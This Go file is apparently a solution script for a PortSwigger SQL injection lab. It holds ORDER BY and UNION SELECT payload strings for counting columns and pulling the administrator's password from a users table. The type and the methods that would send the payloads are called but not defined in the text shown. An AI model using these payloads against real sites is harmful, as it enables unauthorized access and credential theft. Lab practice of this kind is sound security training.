package main

// lab url: https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables#

import (
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

const (
	uriPath                  = "/filter?category=abc"
	payloadToGetNumOfColumns = "'+ORDER+BY+{}--"
	payloadWithUNION         = "'+UNION+SELECT+{}--"
	username                 = "administrator" // Target username to find password for
	dbTableName              = "users"         // Target table
	dbColumnUsername         = "username"      // Target username column
	dbColumnPassword         = "password"      // Target password column
	maxColumnSearch          = 100             // Limit search for columns to prevent excessive requests
)

// Config holds application configuration parsed from command-line flags.
type Config struct {
	LabURL   string
	ProxyURL string
}

func main() {
	// Configure logging to standard error without timestamps
	log.SetFlags(0)
	log.SetPrefix("[-] ") // Prefix log messages for consistency

	config, err := parseArgs()
	if err != nil {
		// parseArgs already prints usage info on error
		os.Exit(1)
	}

	tester,err := newSQLInjectionTester(config)
	if err != nil {
		log.Fatalf("Failed to initialize tester: %v", err)
	}

	fmt.Println("[+] Starting SQL injection test against:", config.LabURL)

	// 1. Find the number of columns
	fmt.Println("[+] Determining number of columns...")
	numOfColumns, err := tester.findNumOfColumns()
	if err != nil {
		log.Fatalf("Failed to find number of columns: %v", err)
	}
	fmt.Printf("[+] Found %d columns.\n", numOfColumns)

	// 2. Perform UNION attack and extract password
	fmt.Println("[+] Attempting UNION attack to retrieve administrator password...")
	adminPassword, err := tester.getAdminPassword(numOfColumns) // Renamed for clarity
	if err != nil {
		log.Fatalf("Failed to retrieve administrator password: %v", err)
	}

	if adminPassword != "" {
		fmt.Println("[+] Attack successful!")
		fmt.Printf("[+] Administrator password: %s\n", adminPassword)
	} else {
		// This case should ideally be covered by errors above, but added for completeness
		fmt.Println("[-] Attack finished, but password was not found (unexpected state).")
	}
}

// parseArgs parses command-line arguments and returns Config or an error.
func parseArgs() (Config, error) {
	config := Config{}

	flag.StringVar(&config.LabURL, "u", "", "Target URL of the PortSwigger Lab (required)")
	flag.StringVar(&config.ProxyURL, "proxy", "", "Optional proxy URL (e.g., http://127.0.0.1:8080)")
	flag.Parse() // Parse flags defined above

	if config.LabURL == "" {
		fmt.Println("Error: Target lab URL (-u) must be provided.")
		fmt.Println("Usage:")
		flag.PrintDefaults() // Print default usage information
		return config, errors.New("missing target URL")
	}

	// Normalize URL after parsing
	config.LabURL = normalizeURL(config.LabURL)

	return config, nil
}


func exitWithError(message string, err error) {
	fmt.Printf("[-] %s: %v\n", message, err)
	os.Exit(1)
}

// newSQLInjectionTester creates and initializes the tester.
func newSQLInjectionTester(config Config) (*SQLInjectionTester, error) {
	client, err := newHTTPClient(config.ProxyURL)
	if err != nil {
		return nil, fmt.Errorf("failed to create HTTP client: %w", err)
	}

	return &SQLInjectionTester{
		client:    client,
		targetURL: config.LabURL, // Already normalized in parseArgs
	}, nil
}

// newHTTPClient creates an HTTP client, optionally configured with a proxy.
func newHTTPClient(proxyURL string) (*http.Client, error) {
	transport := &http.Transport{}

	if proxyURL != "" {
		parsedProxyURL, err := url.Parse(proxyURL)
		if err != nil {
			// Return error instead of exiting
			return nil, fmt.Errorf("invalid proxy URL %q: %w", proxyURL, err)
		}
		transport.Proxy = http.ProxyURL(parsedProxyURL)
		fmt.Printf("[+] Using proxy: %s\n", proxyURL)
	}

	return &http.Client{Transport: transport}, nil
}

// normalizeURL ensures the URL has a scheme and no trailing slash.
func normalizeURL(rawURL string) string {
	if !strings.HasPrefix(rawURL, "http://") && !strings.HasPrefix(rawURL, "https://") {
		rawURL = "https://" + rawURL // Default to https for labs
	}
	return strings.TrimSuffix(rawURL, "/")
}

// safeClose attempts to close an io.Closer and logs any error.
func safeClose(closer io.Closer) {
	if closer == nil {
		return
	}
	if err := closer.Close(); err != nil {
		// Use log package for consistency
		log.Printf("Error closing resource: %v", err)
	}
}
